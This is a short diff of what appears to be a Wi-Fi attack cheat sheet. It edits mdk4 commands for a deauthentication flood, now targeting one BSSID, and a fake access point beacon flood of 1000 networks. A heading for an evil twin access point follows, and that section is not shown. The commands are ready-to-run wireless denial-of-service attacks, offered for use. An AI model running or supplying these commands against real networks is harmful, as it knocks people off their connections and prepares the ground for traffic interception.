@@ -83,12 +83,12 @@ sudo iwconfig wlan0mon channel <channel_number>
 
 #### 🚫 Deauthentication Flood
 ```bash
-mdk4 wlan0mon d
+mdk4 wlan0mon d -B <BSSID>
 ```
 
 #### 🌀 Fake Access Point Flood
 ```bash
-mdk4 wlan0mon a
+mdk4 wlan0mon b -s 1000
 ```
 
 #### 🎭 Evil Twin Access Point
